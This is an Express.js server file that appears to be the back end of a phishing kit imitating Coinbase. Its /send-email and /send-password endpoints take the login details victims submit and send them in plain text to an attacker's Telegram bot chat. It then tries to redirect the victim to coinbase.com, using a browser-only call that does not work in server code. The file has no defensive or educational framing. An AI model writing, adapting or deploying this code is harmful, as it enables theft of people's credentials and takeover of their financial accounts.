const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const fetch = require('node-fetch');

dotenv.config();

const app = express();

app.use(cors());
app.use(express.json());

const sendTelegramMessage = async (type, data) => {
    const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: process.env.CHAT_ID,
                text: `${type} received: ${data}`,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            console.error('Error sending message to Telegram:', await response.text());
            return false;
        }

        return true;
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        return false;
    }
};

app.post('/send-email', async (req, res) => {
    const { email } = req.body;

    try {
        const success = await sendTelegramMessage('Email', email);
        if (success) {
            res.status(200).json({ message: 'Email sent successfully' });
        } else {
            res.status(500).json({ error: 'Failed to send email' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

app.post('/send-password', async (req, res) => {
    const { password } = req.body;

    try {
        const success = await sendTelegramMessage('Password', password);
        if (success) {
            res.status(200).json({ message: 'Password sent successfully' });
            window.location.href = 'https://www.coinbase.com';
        } else {
            res.status(500).json({ error: 'Failed to send password' });
        }
    } catch (error) {
        res.status(500).json({ error: 'Internal server error' });
    }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
